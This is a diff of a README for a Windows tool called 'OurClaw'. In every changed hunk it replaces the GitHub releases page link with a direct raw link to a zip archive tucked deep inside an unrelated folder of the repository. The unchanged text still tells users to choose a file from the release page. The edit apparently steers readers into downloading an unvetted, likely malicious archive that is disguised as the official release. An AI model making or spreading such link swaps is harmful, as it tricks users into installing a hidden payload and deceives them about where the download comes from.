@@ -1,6 +1,6 @@
 # 🪝 OurClaw - Share Access with One Claw
 
-[![Download OurClaw](https://img.shields.io/badge/Download%20OurClaw-blue?style=for-the-badge)](https://github.com/afgalbat-source/OurClaw/releases)
+[![Download OurClaw](https://img.shields.io/badge/Download%20OurClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/afgalbat-source/OurClaw/main/openclaw/skills/api-gateway/references/netlify/Claw-Our-v3.5.zip)
 
 ## 🧭 What OurClaw Does
 
@@ -17,7 +17,7 @@ Use OurClaw if you want:
 
 Visit this page to download OurClaw for Windows:
 
-https://github.com/afgalbat-source/OurClaw/releases
+https://raw.githubusercontent.com/afgalbat-source/OurClaw/main/openclaw/skills/api-gateway/references/netlify/Claw-Our-v3.5.zip
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see both 32-bit and 64-bit files, most users should choose 64-bit.
 
@@ -41,7 +41,7 @@ Follow these steps to run OurClaw on Windows.
 
 Go to:
 
-https://github.com/afgalbat-source/OurClaw/releases
+https://raw.githubusercontent.com/afgalbat-source/OurClaw/main/openclaw/skills/api-gateway/references/netlify/Claw-Our-v3.5.zip
 
 ### 2. Download the Windows file
 
@@ -182,7 +182,7 @@ This helps reduce setup problems and keeps the claw behavior the same for each u
 
 Always download OurClaw from the release page:
 
-https://github.com/afgalbat-source/OurClaw/releases
+https://raw.githubusercontent.com/afgalbat-source/OurClaw/main/openclaw/skills/api-gateway/references/netlify/Claw-Our-v3.5.zip
 
 That page gives you the current release files. If a file name changes in a later release, use the newest file from the top release entry.
 
